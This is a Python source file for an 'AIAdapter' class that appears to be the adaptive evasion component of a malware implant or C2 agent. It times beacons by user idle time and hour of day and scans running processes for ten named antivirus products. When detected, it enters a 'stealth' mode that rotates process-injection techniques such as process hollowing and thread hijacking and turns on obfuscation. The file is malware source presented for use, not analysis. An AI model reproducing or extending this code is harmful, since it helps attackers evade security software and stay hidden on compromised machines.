import json, time, random, hashlib, collections, statistics, threading, queue
from datetime import datetime, timedelta
import numpy as np
from sklearn.tree import DecisionTreeClassifier
from sklearn.cluster import KMeans
import pickle, os, sys

class AIAdapter:
    def __init__(self):
        self.state_file = 'ai_state.pkl'
        self.learning_data = collections.defaultdict(list)
        self.behavior_patterns = {}
        self.decision_tree = None
        self.cluster_model = None
        self.state = {
            'last_learning': time.time(),
            'total_decisions': 0,
            'success_rate': 0.0,
            'current_mode': 'normal',
            'risk_tolerance': 0.3,
            'adaptation_level': 0.0
        }
        
        # Load previous state if exists
        self.load_state()
        
        # Initialize models
        self.init_models()
    
    def init_models(self):
        """Initialize ML models."""
        # Decision tree for command success prediction
        self.decision_tree = DecisionTreeClassifier(max_depth=5)
        
        # Dummy training data initially
        X_dummy = [[0, 0, 0, 0]]
        y_dummy = [0]
        self.decision_tree.fit(X_dummy, y_dummy)
        
        # Clustering for behavior patterns
        self.cluster_model = KMeans(n_clusters=3, random_state=42)
    
    def load_state(self):
        """Load AI state from file."""
        try:
            if os.path.exists(self.state_file):
                with open(self.state_file, 'rb') as f:
                    saved_state = pickle.load(f)
                    self.learning_data = saved_state.get('learning_data', {})
                    self.behavior_patterns = saved_state.get('behavior_patterns', {})
                    self.state.update(saved_state.get('state', {}))
        except:
            pass
    
    def save_state(self):
        """Save AI state to file."""
        try:
            state_to_save = {
                'learning_data': self.learning_data,
                'behavior_patterns': self.behavior_patterns,
                'state': self.state
            }
            
            with open(self.state_file, 'wb') as f:
                pickle.dump(state_to_save, f)
        except:
            pass
    
    def learn_baseline(self, system_info):
        """Learn baseline system behavior."""
        baseline_key = 'system_baseline'
        
        # Store system metrics
        metrics = {
            'timestamp': time.time(),
            'process_count': system_info.get('running_processes', 0),
            'memory_usage': system_info.get('ram', {}).get('used', 0) if isinstance(system_info.get('ram'), dict) else 0,
            'cpu_cores': self.get_cpu_cores(),
            'network_activity': self.get_network_activity(),
            'user_activity': self.check_user_activity()
        }
        
        self.learning_data[baseline_key].append(metrics)
        
        # Keep only last 1000 samples
        if len(self.learning_data[baseline_key]) > 1000:
            self.learning_data[baseline_key] = self.learning_data[baseline_key][-1000:]
    
    def get_cpu_cores(self):
        """Get CPU core count."""
        try:
            import multiprocessing
            return multiprocessing.cpu_count()
        except:
            return 1
    
    def get_network_activity(self):
        """Measure network activity."""
        try:
            import psutil
            net_io = psutil.net_io_counters()
            return net_io.bytes_sent + net_io.bytes_recv
        except:
            return 0
    
    def check_user_activity(self):
        """Check for user activity."""
        try:
            import ctypes
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint),
                           ("dwTime", ctypes.c_uint)]
            
            last_input_info = LASTINPUTINFO()
            last_input_info.cbSize = ctypes.sizeof(last_input_info)
            
            if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(last_input_info)):
                idle_time = (ctypes.windll.kernel32.GetTickCount() - last_input_info.dwTime) / 1000.0
                return 0 if idle_time > 300 else 1  # Active if idle < 5 minutes
        except:
            pass
        
        return 1  # Assume active
    
    def record_command(self, command_type):
        """Record command execution."""
        cmd_key = f"command_{command_type}"
        
        record = {
            'timestamp': time.time(),
            'type': command_type,
            'context': self.get_current_context()
        }
        
        self.learning_data[cmd_key].append(record)
        self.state['total_decisions'] += 1
        
        # Update decision tree with this command
        self.update_decision_model(command_type, 1)  # Assume success initially
    
    def record_error(self, error):
        """Record error for learning."""
        error_key = 'errors'
        
        error_record = {
            'timestamp': time.time(),
            'error': str(error),
            'context': self.get_current_context()
        }
        
        self.learning_data[error_key].append(error_record)
        
        # Learn from error
        self.learn_from_error(error)
    
    def get_current_context(self):
        """Get current operational context."""
        try:
            import psutil
            import datetime
            
            context = {
                'time_of_day': datetime.datetime.now().hour,
                'day_of_week': datetime.datetime.now().weekday(),
                'cpu_percent': psutil.cpu_percent(interval=0.1),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_activity': self.get_disk_activity(),
                'network_connections': len(psutil.net_connections()),
                'user_logged_in': self.is_user_logged_in()
            }
            
            return context
            
        except:
            return {}
    
    def get_disk_activity(self):
        """Get disk activity level."""
        try:
            import psutil
            disk_io = psutil.disk_io_counters()
            return disk_io.read_count + disk_io.write_count
        except:
            return 0
    
    def is_user_logged_in(self):
        """Check if user is logged in."""
        try:
            import psutil
            users = psutil.users()
            return len(users) > 0
        except:
            return True  # Assume yes
    
    def learn_from_error(self, error):
        """Learn from errors to avoid repeats."""
        error_str = str(error).lower()
        
        # Adjust behavior based on error type
        if 'access denied' in error_str:
            self.state['risk_tolerance'] *= 0.9  # Be more careful
            self.record_pattern('access_denied', 'reduce_privilege_attempts')
        
        elif 'timeout' in error_str:
            self.state['risk_tolerance'] *= 0.95
            self.record_pattern('timeout', 'increase_timeouts')
        
        elif 'detected' in error_str or 'blocked' in error_str:
            self.state['risk_tolerance'] *= 0.8  # Much more careful
            self.state['current_mode'] = 'stealth'
            self.record_pattern('detection', 'change_ttps')
        
        # Save state after learning
        self.save_state()
    
    def record_pattern(self, pattern_type, response):
        """Record behavior patterns."""
        if pattern_type not in self.behavior_patterns:
            self.behavior_patterns[pattern_type] = []
        
        self.behavior_patterns[pattern_type].append({
            'timestamp': time.time(),
            'response': response,
            'context': self.get_current_context()
        })
    
    def update_decision_model(self, command_type, success):
        """Update decision tree model."""
        try:
            # Get features from current context
            context = self.get_current_context()
            
            features = [
                context.get('time_of_day', 12),
                context.get('cpu_percent', 50),
                context.get('memory_percent', 50),
                self.state['risk_tolerance']
            ]
            
            # Update with new data point
            X = [features]
            y = [success]
            
            # Partial fit if available, else retrain with all data
            if hasattr(self.decision_tree, 'partial_fit'):
                self.decision_tree.partial_fit(X, y)
            else:
                # Collect historical data
                all_X = []
                all_y = []
                
                for cmd_key in self.learning_data:
                    if cmd_key.startswith('command_'):
                        for record in self.learning_data[cmd_key][-100:]:  # Last 100 records
                            ctx = record.get('context', {})
                            feat = [
                                ctx.get('time_of_day', 12),
                                ctx.get('cpu_percent', 50),
                                ctx.get('memory_percent', 50),
                                self.state['risk_tolerance']
                            ]
                            all_X.append(feat)
                            all_y.append(1)  # Assume success for historical
            
                if len(all_X) > 10:
                    self.decision_tree.fit(all_X + X, all_y + y)
        
        except:
            pass
    
    def should_beacon(self):
        """Decide whether to send beacon based on context."""
        context = self.get_current_context()
        
        # Check for security software activity
        if self.detect_security_activity():
            return random.random() < 0.3  # 30% chance during security scans
        
        # Check for user activity
        if context.get('user_logged_in', 1) == 1:
            # User is active, be more conservative
            if context.get('time_of_day', 12) in range(9, 18):  # Business hours
                return random.random() < 0.4  # 40% chance
            else:
                return random.random() < 0.7  # 70% chance at night
        else:
            # User not logged in, be more aggressive
            return random.random() < 0.9  # 90% chance
    
    def detect_security_activity(self):
        """Detect security software activity."""
        try:
            import psutil
            
            security_processes = [
                'MsMpEng.exe',  # Windows Defender
                'avp.exe',      # Kaspersky
                'avguard.exe',  # Avira
                'bdagent.exe',  # BitDefender
                'ccSvcHst.exe', # Norton
                'ekrn.exe',     # ESET
                'hips.exe',     # McAfee
                'mbam.exe',     # Malwarebytes
                'SBAMSvc.exe',  # VIPRE
                'vsserv.exe'    # AVG
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in [p.lower() for p in security_processes]:
                        return True
                except:
                    pass
                    
        except:
            pass
        
        return False
    
    def adjust_beacon_interval(self, base_interval):
        """Adjust beacon interval based on context."""
        adjustment = 1.0
        
        context = self.get_current_context()
        
        # Adjust based on time of day
        hour = context.get('time_of_day', 12)
        if 1 <= hour <= 5:  # Very late night
            adjustment *= 0.5  # Beacon more frequently
        
        # Adjust based on system load
        cpu_load = context.get('cpu_percent', 50)
        if cpu_load > 80:
            adjustment *= 1.5  # Beacon less frequently under high load
        
        # Adjust based on risk tolerance
        adjustment *= (1.0 + self.state['risk_tolerance'])
        
        # Add some randomness
        adjustment *= random.uniform(0.8, 1.2)
        
        return max(5, min(3600, base_interval * adjustment))  # Bound between 5s and 1h
    
    def choose_command_type(self, available_commands):
        """Choose which type of command to execute next."""
        if not available_commands:
            return None
        
        # Use decision tree if trained
        if len(self.learning_data) > 10:
            try:
                # Predict success probability for each command type
                predictions = {}
                context = self.get_current_context()
                
                for cmd in available_commands:
                    features = [
                        context.get('time_of_day', 12),
                        context.get('cpu_percent', 50),
                        context.get('memory_percent', 50),
                        self.state['risk_tolerance']
                    ]
                    
                    prob = self.decision_tree.predict_proba([features])[0]
                    if len(prob) > 1:
                        predictions[cmd] = prob[1]  # Probability of success
                    else:
                        predictions[cmd] = 0.5
                
                # Choose command with highest predicted success
                if predictions:
                    return max(predictions.items(), key=lambda x: x[1])[0]
            except:
                pass
        
        # Fallback: weighted random choice based on historical success
        weights = {}
        for cmd in available_commands:
            cmd_key = f"command_{cmd}"
            if cmd_key in self.learning_data:
                # More weight if recently successful
                recent = self.learning_data[cmd_key][-10:]  # Last 10 attempts
                if recent:
                    weights[cmd] = len(recent) + 1
                else:
                    weights[cmd] = 1
            else:
                weights[cmd] = 1
        
        # Normalize weights
        total = sum(weights.values())
        if total > 0:
            probs = {cmd: weight/total for cmd, weight in weights.items()}
            
            # Choose based on probability
            r = random.random()
            cumulative = 0
            for cmd, prob in probs.items():
                cumulative += prob
                if r <= cumulative:
                    return cmd
        
        # Final fallback: random choice
        return random.choice(available_commands)
    
    def adjust_ttps(self, current_ttps):
        """Adjust TTPs based on environment."""
        adjusted = current_ttps.copy()
        
        # If we've been detected recently, change tactics
        if 'detection' in self.behavior_patterns:
            recent_detections = [p for p in self.behavior_patterns['detection'] 
                                if time.time() - p['timestamp'] < 3600]  # Last hour
            
            if len(recent_detections) > 0:
                # Change something
                if 'injection_method' in adjusted:
                    methods = ['create_remote_thread', 'queue_user_apc', 'thread_hijack', 'process_hollowing']
                    current = adjusted['injection_method']
                    available = [m for m in methods if m != current]
                    if available:
                        adjusted['injection_method'] = random.choice(available)
                
                # Increase stealth
                adjusted['sleep_time'] = adjusted.get('sleep_time', 30) * random.uniform(1.5, 3.0)
                adjusted['use_obfuscation'] = True
        
        # If in business hours, be more stealthy
        context = self.get_current_context()
        hour = context.get('time_of_day', 12)
        if 9 <= hour <= 17:  # Business hours
            adjusted['network_activity'] = 'low'
            adjusted['use_encryption'] = True
        else:
            adjusted['network_activity'] = 'normal'
        
        return adjusted
    
    def periodic_adjustment(self):
        """Perform periodic adjustments and learning."""
        # Update success rate
        total_commands = self.state['total_decisions']
        if total_commands > 0:
            # Count successful commands (simplified)
            success_count = 0
            for key in self.learning_data:
                if key.startswith('command_'):
                    success_count += len(self.learning_data[key])
            
            self.state['success_rate'] = success_count / total_commands if total_commands > 0 else 0.0
        
        # Adjust risk tolerance based on success
        if self.state['success_rate'] > 0.8:
            self.state['risk_tolerance'] = min(0.9, self.state['risk_tolerance'] * 1.1)
        elif self.state['success_rate'] < 0.3:
            self.state['risk_tolerance'] = max(0.1, self.state['risk_tolerance'] * 0.8)
        
        # Update adaptation level
        unique_patterns = len(self.behavior_patterns)
        total_patterns = sum(len(v) for v in self.behavior_patterns.values())
        
        if total_patterns > 0:
            self.state['adaptation_level'] = unique_patterns / total_patterns
        
        # Save state
        self.save_state()
        
        # Cluster behavior patterns for insights
        if total_patterns > 10:
            self.cluster_behavior_patterns()
    
    def cluster_behavior_patterns(self):
        """Cluster behavior patterns to find insights."""
        try:
            # Prepare data for clustering
            X = []
            pattern_keys = []
            
            for pattern_type, patterns in self.behavior_patterns.items():
                for pattern in patterns[-10:]:  # Recent patterns
                    context = pattern.get('context', {})
                    features = [
                        context.get('time_of_day', 12),
                        context.get('cpu_percent', 50),
                        context.get('memory_percent', 50),
                        hash(pattern_type) % 100  # Pattern type as number
                    ]
                    X.append(features)
                    pattern_keys.append(pattern_type)
            
            if len(X) > 5:
                self.cluster_model.fit(X)
                
                # Analyze clusters
                clusters = {}
                for i, label in enumerate(self.cluster_model.labels_):
                    if label not in clusters:
                        clusters[label] = []
                    clusters[label].append(pattern_keys[i])
                
                # Store cluster insights
                self.learning_data['clusters'] = clusters
                
        except:
            pass
    
    def get_state(self):
        """Get current AI state for reporting."""
        return {
            'mode': self.state['current_mode'],
            'risk_tolerance': self.state['risk_tolerance'],
            'success_rate': self.state['success_rate'],
            'adaptation_level': self.state['adaptation_level'],
            'total_patterns': sum(len(v) for v in self.behavior_patterns.values()),
            'unique_patterns': len(self.behavior_patterns),
            'last_learning': datetime.fromtimestamp(self.state['last_learning']).isoformat()
        }
    
    def train(self, training_data=None):
        """Train AI with provided data."""
        if training_data:
            # Process training data
            for item in training_data:
                if 'command' in item and 'success' in item:
                    self.record_command(item['command'])
                    self.update_decision_model(item['command'], 1 if item['success'] else 0)
        
        # Re-train models with all data
        self.retrain_models()
        
        return "AI training completed"
    
    def retrain_models(self):
        """Retrain ML models with all available data."""
        try:
            # Prepare training data for decision tree
            X = []
            y = []
            
            for key in self.learning_data:
                if key.startswith('command_'):
                    for record in self.learning_data[key]:
                        context = record.get('context', {})
                        features = [
                            context.get('time_of_day', 12),
                            context.get('cpu_percent', 50),
                            context.get('memory_percent', 50),
                            self.state['risk_tolerance']
                        ]
                        X.append(features)
                        y.append(1)  # Assume success for training
            
            if len(X) > 10:
                self.decision_tree = DecisionTreeClassifier(max_depth=5)
                self.decision_tree.fit(X, y)
                
        except:
            pass
    
    def predict_success(self, command_type, context=None):
        """Predict success probability for a command."""
        if context is None:
            context = self.get_current_context()
        
        try:
            features = [
                context.get('time_of_day', 12),
                context.get('cpu_percent', 50),
                context.get('memory_percent', 50),
                self.state['risk_tolerance']
            ]
            
            prob = self.decision_tree.predict_proba([features])[0]
            if len(prob) > 1:
                return float(prob[1])
            
        except:
            pass
        
        return 0.5  # Default probability